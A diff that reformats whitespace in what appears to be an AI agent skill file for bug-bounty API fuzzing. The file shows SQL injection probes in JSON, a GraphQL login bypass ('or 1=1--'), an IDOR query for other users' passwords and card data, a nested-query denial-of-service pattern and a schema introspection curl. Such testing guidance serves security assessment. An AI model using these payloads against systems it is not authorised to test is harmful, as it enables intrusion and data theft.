@@ -2,8 +2,8 @@
 name: API Fuzzing for Bug Bounty
 description: This skill should be used when the user asks to "test API security", "fuzz APIs", "find IDOR vulnerabilities", "test REST API", "test GraphQL", "API penetration testing", "bug bounty API testing", or needs guidance on API security assessment techniques.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # API Fuzzing for Bug Bounty
@@ -116,11 +116,11 @@ URL?id=<LEGIT>&id=<VICTIM>
 **SQL Injection in JSON:**
 
 ```json
-{"id":"56456"}                    → OK
-{"id":"56456 AND 1=1#"}           → OK  
-{"id":"56456 AND 1=2#"}           → OK
-{"id":"56456 AND 1=3#"}           → ERROR (vulnerable!)
-{"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
+{"id":"56456"} → OK
+{"id":"56456 AND 1=1#"} → OK 
+{"id":"56456 AND 1=2#"} → OK
+{"id":"56456 AND 1=3#"} → ERROR (vulnerable!)
+{"id":"56456 AND sleep(15)#"} → SLEEP 15 SEC
 ```
 
 **Command Injection:**
@@ -193,11 +193,11 @@ Fetch entire backend schema:
 ```graphql
 # Try accessing other user IDs
 query {
-  user(id: "OTHER_USER_ID") {
-    email
-    password
-    creditCard
-  }
+ user(id: "OTHER_USER_ID") {
+ email
+ password
+ creditCard
+ }
 }
 ```
 
@@ -205,13 +205,13 @@ query {
 
 ```graphql
 mutation {
-  login(input: {
-    email: "test' or 1=1--"
-    password: "password"
-  }) {
-    success
-    jwt
-  }
+ login(input: {
+ email: "test' or 1=1--"
+ password: "password"
+ }) {
+ success
+ jwt
+ }
 }
 ```
 
@@ -227,19 +227,19 @@ mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
 
 ```graphql
 query {
-  posts {
-    comments {
-      user {
-        posts {
-          comments {
-            user {
-              posts { ... }
-            }
-          }
-        }
-      }
-    }
-  }
+ posts {
+ comments {
+ user {
+ posts {
+ comments {
+ user {
+ posts { ... }
+ }
+ }
+ }
+ }
+ }
+ }
 }
 ```
 
@@ -416,8 +416,8 @@ Authorization: Bearer <token>
 
 ```bash
 curl -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{__schema{types{name,fields{name}}}}"}'
+ -H "Content-Type: application/json" \
+ -d '{"query":"{__schema{types{name,fields{name}}}}"}'
 ```
 
 ---
